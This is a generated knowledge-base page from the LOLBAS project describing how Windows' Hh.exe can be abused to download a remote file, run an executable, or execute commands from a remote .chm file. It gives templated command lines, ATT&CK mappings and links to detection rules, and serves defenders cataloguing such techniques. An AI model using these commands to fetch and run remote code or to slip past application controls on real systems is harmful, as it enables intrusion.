---
title: "Hh.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OSBinaries/Hh.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Hh.yml"
build_date: "2026-04-27 18:39:01"
category: "OSBinaries"
aliases:
  - "Hh.exe"
functions:
  - "Download"
  - "Execute"
attack_technique_ids:
  - "T1105"
  - "T1218.001"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Hh.exe

Binary used for processing chm files in Windows

## Metadata

- Category: OSBinaries
- Created: 2018-05-25
- Author: Oddvar Moe
- Source Path: yml/OSBinaries/Hh.yml

## Paths

- `C:\Windows\hh.exe`
- `C:\Windows\SysWOW64\hh.exe`

## Commands

### 1. Download

Open the target batch script with HTML Help.

```cmd
HH.exe {REMOTEURL:.bat}
```

- Use Case: Download files from url
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]

### 2. Execute

Executes specified executable with HTML Help.

```cmd
HH.exe {PATH_ABSOLUTE:.exe}
```

- Use Case: Execute process with HH.exe
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218.001]]

### 3. Execute

Executes a remote .chm file which can contain commands.

```cmd
HH.exe {REMOTEURL:.chm}
```

- Use Case: Execute commands with HH.exe
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218.001]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_hh_chm_execution.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_hh_html_help_susp_child_process.yml
- Elastic: https://github.com/elastic/detection-rules/blob/ef7548f04c4341e0d1a172810330d59453f46a21/rules/windows/execution_via_compiled_html_file.toml
- Elastic: https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/execution_html_help_executable_program_connecting_to_the_internet.toml
- Splunk: https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_html_help_spawn_child_process.yml
- Splunk: https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_html_help_url_in_command_line.yml

## Resources

- {'Link': 'https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/'}

## Acknowledgements

- {'Person': 'Oddvar Moe', 'Handle': '@oddvarmoe'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Hh.yml)
